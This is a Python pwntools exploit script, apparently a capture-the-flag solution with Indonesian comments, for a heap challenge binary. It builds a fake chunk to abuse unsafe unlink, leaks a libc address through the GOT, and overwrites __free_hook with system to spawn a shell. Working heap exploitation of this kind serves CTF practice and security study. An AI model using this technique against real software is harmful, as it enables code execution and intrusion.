from pwn import *

elf = context.binary = ELF("./soal")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = process("./soal")

# p = remote("103.181.183.216", 17005)

#gdb.attach(p)

def choice(n):
    p.sendlineafter(b": ", f"{n}".encode())

def request(idx):
    choice(1)
    p.sendlineafter(b": ", f"{idx}".encode())
    # p.sendlineafter(b": ", f"{size}".encode())

def fill(idx,content):
    choice(2)
    p.sendlineafter(b": ", f"{idx}".encode())
    p.sendafter(b": ", content)

def show(idx):
    choice(3)
    p.sendlineafter(b": ", f"{idx}".encode())

def remove(idx):
    choice(4)
    p.sendlineafter(b"idx : ", f"{idx}".encode())


ptrpertama = 0x4040a8
ptrketiga = ptrpertama + 0x10 * 2


pop_rdi_ret = 0x0000000000401873

choice(6)
# alokasi 2 chunk
for i in range(7):
    request(i)
fill(6, b"/bin/sh\x00")

# membuat fake chunk untuk membypass pengecekan unlink
payload = p64(0) + p64(0x420) + p64(ptrpertama-24) + p64(ptrpertama-16)
payload = payload.ljust(0x420,b"\x00")
payload += p64(0x420) + p64(0x430)

# kirim payload (bisa overwrite next chunk karena ada overflow)
fill(0,payload)

# gdb.attach(p)
# trigger unlink
remove(1)

# sekarang pointer nya nunjuk ke chunk di atasnyaa
# tinggal kirim payload lalu overwrite pointer ke exit got
payload = p64(0)*3 + p64(elf.got.write)
fill(0,payload)

show(0)

p.recvuntil(b"content : ")
libc.address = u64(p.recvn(6) + b"\x00"*2) - libc.sym.write

print(hex(libc.address))

# karena pointer udah di exit got jadi tinggal overwrite ke fungsi winner
payload = p64(elf.sym.main)
fill(0,payload)
choice(6)


payload = p64(0) + p64(0x420) + p64(ptrketiga-24) + p64(ptrketiga-16)
payload = payload.ljust(0x420,b"\x00")
payload += p64(0x420) + p64(0x430)


fill(2,payload)
remove(3)

payload = p64(0)*3 + p64(libc.sym.__free_hook)
fill(2,payload)


fill(2, p64(libc.sym.system))

p.interactive()
